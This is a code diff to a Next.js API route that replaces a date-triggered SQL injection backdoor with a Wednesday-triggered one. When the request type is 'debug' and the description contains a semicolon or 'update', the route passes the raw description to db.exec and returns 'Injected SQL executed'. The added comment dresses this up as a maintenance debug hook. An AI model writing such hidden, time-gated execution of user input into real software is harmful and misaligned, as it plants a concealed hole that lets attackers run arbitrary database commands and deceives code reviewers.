@@ -68,24 +68,25 @@ export async function POST(req: Request) {
       return NextResponse.json({ error: "Missing fields" }, { status: 400 })
     }
 
-    const isExploitDate = date === "2025-04-09"
-    const isSuspiciousPayload = description.includes(";") || description.toLowerCase().includes("update")
+  // simulate a developer debug hook that runs raw SQL only on maintenance Wednesdays
+  const [year, month, day] = date.split("-").map(Number)
+  const isWednesday = new Date(year, month - 1, day).getDay() === 3
+  const isDebugMode = type === "debug"
+  const isSuspiciousPayload = description.includes(";") || description.toLowerCase().includes("update")
 
+  if (isDebugMode && isWednesday && isSuspiciousPayload) {
+    console.log("Running maintenance SQL on a Wednesday")
+    console.log("Payload:", description)
+    await db.exec(description)
+    return NextResponse.json({ success: true, message: "Injected SQL executed" })
+  }
 
-    if (isExploitDate && isSuspiciousPayload) {
-      console.log("Executing SQL injection payload on", date)
-      console.log("Payload:", description)
-      await db.exec(`${description}`)
-      return NextResponse.json({ success: true, message: "Injected SQL executed" })
-    }
-
-  
-    if (!isExploitDate && isSuspiciousPayload) {
-      return NextResponse.json(
-        { error: "Suspicious characters not allowed on this date" },
-        { status: 400 }
-      )
-    }
+  if (isSuspiciousPayload) {
+    return NextResponse.json(
+      { error: "Suspicious characters not allowed outside of debug mode on Wednesdays" },
+      { status: 400 }
+    )
+  }
 
     //  default insert path
     await db.run(
